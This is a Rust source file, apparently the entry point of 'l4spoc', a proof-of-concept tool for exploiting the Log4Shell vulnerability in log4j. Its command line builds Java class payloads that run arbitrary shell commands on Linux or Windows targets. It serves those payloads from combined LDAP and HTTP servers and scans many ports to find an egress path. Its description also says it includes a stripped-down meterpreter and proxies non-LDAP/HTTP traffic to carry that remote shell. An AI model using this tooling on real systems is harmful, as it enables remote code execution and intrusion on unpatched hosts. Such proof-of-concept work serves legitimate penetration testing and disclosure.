#![feature(ip)]

mod web_server;
mod ldap_server;
mod build_java;
mod common;
mod multiplexed;
mod tcp_proxy;

use common::{RunServerCfg, BuildCmdCfg, ClassCache};
use std::fs;
use get_if_addrs::{IfAddr, get_if_addrs};
use clap::{Arg, Command, ArgMatches};

#[tokio::main]
async fn main() -> () {
    let matches = Command::new("l4spoc")
        .subcommand_required(true)
        .version("0.8.0")
        .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
        .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.  You can run on multiple ports simultaneously to attempt to see what ports may be available for egress on the target machine.  This version adds a proxy option.  If the request is not LDAP or HTTP it can then proxy the request to another machine, again on the same port.  If the target machine has only one egress port you can server LDAP, HTTP and use the same port to proxy the meterpreter connection to another local port or another machine.")
        .subcommand(Command::new("build")
            .about("Build java class payload")
            .arg(Arg::new("class_name")
                .long("class_name")
                .short('c')
                .takes_value(true)
                .required(true)
                .help("The name of the Class to build.  It is what you would request via jndi.  for a Cmd1.class you would use Cmd1")) 
            .arg(Arg::new("linux_cmd")
                .long("linux")
                .short('l')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Linux Systems via /bin/sh -c \"the_command\"")
            ).arg(Arg::new("windows_cmd")
                .long("windows")
                .short('w')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Windows Systems via cmd -C \"the_command\"")
            ).arg(Arg::new("build_path")
                .long("build_path")
                .short('b')
                .default_value("wwwroot")
                .takes_value(true)
                .help("the dir to build the payloads.  Will create if it doesn't exist.  Should use same dir as www_root in run_servers.")
            ))
        .subcommand(Command::new("run")
            .about("Run the ldap and http servers")
            .arg(Arg::new("addr")
                .long("addr")
                .short('a')
                .default_value("")
                .takes_value(true)
                .help("The http address to publish")
            ).arg(Arg::new("ports")
                .long("ports")
                .short('p')
                .default_value("")
                .takes_value(true)
                .help("The ports used to server the LDAP and HTTP requests from.")
            ).arg(Arg::new("Op")
                .long("Op")
                .takes_value(true)
                .help("The name of the file to write the opened ports to.")
            ).arg(Arg::new("Of")
                .long("Of")
                .takes_value(true)
                .help("The name of the file to write the failed ports to.")
            ).arg(Arg::new("pF")
                .long("pF")
                .takes_value(true)
                .help("Load ports from a file.  Expects one port per line, can comment out a line with a #.")
            ).arg(Arg::new("pC20")
                .long("pC20")
                .takes_value(false)
                .help("Use the top 20 common ports.")
             ).arg(Arg::new("pC100")
                .long("pC100")
                .takes_value(false)
                .help("Use the top 100 common ports.")
             ).arg(Arg::new("pC1000")
                .long("pC1000")
                .takes_value(false)
                .help("Use the top 1000 common ports.")
            ).arg(Arg::new("proxy")
                .long("proxy")
                .takes_value(true)
                .help("The proxy address we want to send non http/ldap requests to. foramt = addr:port")
            ).arg(Arg::new("wwwroot")
                .long("wwwroot")
                .default_value("wwwroot")
                .takes_value(true)
                .help("The dir to serve the payloads from.  Will create if it doesn't exist.  Note this should be the same build_path you used for any build_cmd classes.  You can also put in any other classes into this dir.")
            )).get_matches();

    if let Some(m) = matches.subcommand_matches("build"){
        let cfg : BuildCmdCfg = convert_args_for_build_cmd(m);
        let build_path = m.value_of_t_or_exit("build_path");
        fs::create_dir_all(&build_path)
            .expect(&format!("Unable to create {} dir", &build_path));    
        build_java::build_and_save_cmd_class(build_path, cfg).expect("faild to build cmd");
    } else if let Some(m) = matches.subcommand_matches("run"){
        let cfgs = convert_args_for_run_server_cfg(m);
        let build_cfg = BuildCmdCfg{
            class_name : "Test".to_string(),
            l_cmd : "firefox cvs.com".to_string(),
            w_cmd : "".to_string(),
        };
        match build_java::build_cmd_class(build_cfg) {
            Ok(the_class) => cfgs.class_cache.set_class("Test.class".to_string(),the_class),
            Err(e) => println!("Error creating test class {}", e),
        }
        run_servers(cfgs).await;
    } 
}

fn get_default_ip_addr_str() -> String{
    let addrs = match get_if_addrs() {
        Ok(a) => a,
        Err(_) => return "127.0.0.1".to_string()
    };

    for a in &addrs {
        let ip = a.ip();
        if ip.is_ipv4() &&  ip.is_global(){
            return ip.to_string() 
        }
    }
    
    for a in &addrs {
        match &a.addr {
            IfAddr::V4(av4) => {
                if av4.broadcast.is_some() {
                    return av4.ip.to_string();
                }
            },
            _ => continue,
        }
    }

    return "127.0.0.1".to_string();
}

fn parse_port_entry(s : &str) -> Vec<u16>{
    let s = s.trim();
    if s.len() == 0 {return Vec::<u16>::new()};
    let parts : Vec<&str>= s.split("-").collect();
    match parts.len() {
        1 => vec![parts[0].parse().expect(&format!("Error parsing port {} from --ports (-p) arg", s))],
        2 => {
            let l : u16 = parts[0].parse().expect(&format!("Error parsing port {} from entry {} in --ports (-p) arg", parts[0], s)); 
            let h : u16 = parts[1].parse().expect(&format!("Error parsing port {} from entry {} in --ports (-p) arg", parts[1], s)); 
            if l >= h {
                eprintln!("****************");
                eprintln!("WARNING : port range upper value is less than or equal lower value {} from ports (-p) arg", s);
               eprintln!("****************");
            }
            (l..=h).collect()
        },
        _ => panic!("Error parsing port {} from --ports (-p) arg", s),
    }
}

fn parse_ports(ps : String) -> Vec<u16>{
    let ports : Vec<u16> = ps.split(",")
        .flat_map(|s| parse_port_entry(s) )
        .collect();
    ports
}

fn get_c20_ports() -> Vec<u16> {
    let cp20 : Vec<u16> = vec![80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993, 5900];
    cp20
}

fn get_c100_ports() -> Vec<u16> {
    let port_string = "7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157";
    return parse_ports(port_string.to_string());
}

fn get_c1000_ports() -> Vec<u16> {
    let port_string = "1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389";
    return parse_ports(port_string.to_string());
}

fn get_ports_from_file(file_name : &str) -> Vec<u16>{
    let contents = fs::read_to_string(file_name).expect(&format!("Unable to read ports file : {}", file_name)); 
    let file_ports : Vec<u16> = contents.split("\n")
        .filter_map(|line| {
            let s = line.trim();
            if s.len() == 0 || s.starts_with("#") {return None};
            Some(s.parse().expect(&format!("Error parsing port {} from file {}", s, file_name)))
        })
    .collect();
    file_ports
}

fn get_ports_from_args(m : &ArgMatches) -> Vec<u16>{
    let ps : String = m.value_of_t_or_exit("ports");
    let mut ports = parse_ports(ps);

    if m.occurrences_of("pC20") > 0 {
        get_c20_ports().into_iter().for_each(|p| ports.push(p));
    }
    if m.occurrences_of("pC100") > 0 {
        get_c100_ports().into_iter().for_each(|p| ports.push(p));
    }
    if m.occurrences_of("pC1000") > 0 {
        get_c1000_ports().into_iter().for_each(|p| ports.push(p));
    }

    match m.value_of("pF") {
        Some(file_name) => {
            get_ports_from_file(file_name).into_iter().for_each(|p| ports.push(p));
        },
        None => {},
    }

    ports.sort();
    ports.dedup();

    ports
}

fn convert_option(o : Option<&str>) -> Option<String>{
    match o {
        Some(s) => Some(s.to_string()),
        None => None,
    }
}

fn convert_args_for_run_server_cfg(m : &ArgMatches) -> RunServerCfg{
    let mut addr = m.value_of_t_or_exit("addr");
    if addr == "" { addr = get_default_ip_addr_str(); }
    RunServerCfg{
        web_root  : m.value_of_t_or_exit("wwwroot"),
        addr, 
        ports : get_ports_from_args(m),
        ports_file_name : convert_option(m.value_of("Op")),
        failed_file_name : convert_option(m.value_of("Of")),
        proxy_addr : convert_option(m.value_of("proxy")),
        class_cache : ClassCache::new(),
    }
}

async fn run_servers(rsc: RunServerCfg) -> () {
    fs::create_dir_all(&rsc.web_root)
        .expect(&format!("Unable to create {} dir", rsc.web_root));    
    println!("Address base : {}", &rsc.addr);
    multiplexed::run_multiplexed_servers(rsc).await;
}

fn convert_args_for_build_cmd(m : &ArgMatches) -> BuildCmdCfg {
    return BuildCmdCfg{
   //     build_path : m.value_of_t_or_exit("build_path"),
        class_name : m.value_of_t_or_exit("class_name"),
        l_cmd : m.value_of_t_or_exit("linux_cmd"),
        w_cmd : m.value_of_t_or_exit("windows_cmd")
    }
}
